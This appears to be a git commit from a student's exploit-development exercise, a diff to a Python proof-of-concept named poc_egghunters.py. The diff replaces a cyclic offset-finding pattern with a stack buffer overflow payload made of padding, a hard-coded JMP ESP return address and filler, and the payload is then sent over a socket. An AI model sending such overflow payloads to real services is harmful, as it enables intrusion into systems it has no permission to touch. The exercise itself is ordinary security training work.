dbbc4ef3436ec809a77d320e955c2ea18ae65fad
DanielVilaca <a16939@alunos.ipca.pt>
2025-04-14 22:12:13 +0100

    ALSR & DEP Bypass

--- Egghunters/poc_egghunters.py
+++ Egghunters/poc_egghunters.py
@@ -8,7 +8,13 @@ evilString = "A" * 256
 
 cyclic_pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A"
 
-evilString = cyclic_pattern
+
+#625011AF
+JMP_ESP = "\xaf\x11\x50\x62" # 0x625011AF
+
+#evilString = cyclic_pattern
+
+evilString = "A"*70 + JMP_ESP*4 + "C"*(256-4-7)
 
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
